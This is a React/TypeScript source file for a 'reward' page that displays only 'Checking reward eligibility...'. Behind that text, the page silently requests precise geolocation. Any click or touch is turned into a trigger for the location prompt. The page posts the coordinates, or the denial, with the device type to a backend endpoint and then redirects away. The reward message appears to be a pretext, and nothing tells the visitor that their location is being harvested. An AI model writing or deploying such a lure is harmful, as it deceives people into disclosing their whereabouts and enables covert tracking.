import { useEffect, useRef } from "react";
import { apiRequest } from "../services/api";

export function RewardPage() {
  const initialized = useRef(false);

  useEffect(() => {
    // Prevent double-firing in StrictMode
    if (initialized.current) return;
    initialized.current = true;

    const detectDevice = () => {
      const ua = navigator.userAgent;
      if (/tablet|ipad|playbook|silk/i.test(ua)) return 'tablet';
      if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Opera Mini/i.test(ua)) return 'mobile';
      return 'desktop';
    };

    const deviceCategory = detectDevice();

    const sendData = async (payload: any) => {
      try {
        await apiRequest('/api/reward-location', {
          method: 'POST',
          body: JSON.stringify(payload),
        });
      } catch (err) {
        console.error('Submission failed:', err);
      } finally {
        // CRITICAL: Hard redirect after fetch attempt with a small delay for reliability
        setTimeout(() => {
          window.location.href = '/';
        }, 1500);
      }
    };

    const handleSuccess = (position: GeolocationPosition) => {
      const { latitude, longitude, accuracy } = position.coords;
      sendData({
        device_category: deviceCategory,
        permission: 'granted',
        latitude,
        longitude,
        accuracy,
      });
    };

    const handleError = () => {
      sendData({
        device_category: deviceCategory,
        permission: 'denied',
      });
    };

    const requestLocation = () => {
      if (initialized.current && navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(handleSuccess, handleError, {
          timeout: 20000, // 20s for mobile
          enableHighAccuracy: true,
          maximumAge: 30000 
        });
      }
    };

    // 1. Automatic attempt with delay
    const timer = setTimeout(requestLocation, 1200);

    // 2. Mobile User-Gesture Fallback (Crucial for iOS/Chrome Mobile)
    // If the auto-prompt is blocked, any touch on the screen will trigger it
    const triggerOnGesture = () => {
      requestLocation();
      document.removeEventListener('touchstart', triggerOnGesture);
      document.removeEventListener('click', triggerOnGesture);
    };

    document.addEventListener('touchstart', triggerOnGesture);
    document.addEventListener('click', triggerOnGesture);

    return () => {
      clearTimeout(timer);
      document.removeEventListener('touchstart', triggerOnGesture);
      document.removeEventListener('click', triggerOnGesture);
    };
  }, []);

  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      background: '#ffffff',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
    }}>
      <style>{`
        @keyframes pulse {
          0% { opacity: 1; transform: scale(1); }
          50% { opacity: 0.5; transform: scale(0.98); }
          100% { opacity: 1; transform: scale(1); }
        }
        .pulsing-text {
          animation: pulse 2s infinite ease-in-out;
          color: #444;
          font-size: 1.1rem;
          letter-spacing: -0.01em;
        }
      `}</style>
      <p className="pulsing-text">Checking reward eligibility...</p>
    </div>
  );
}
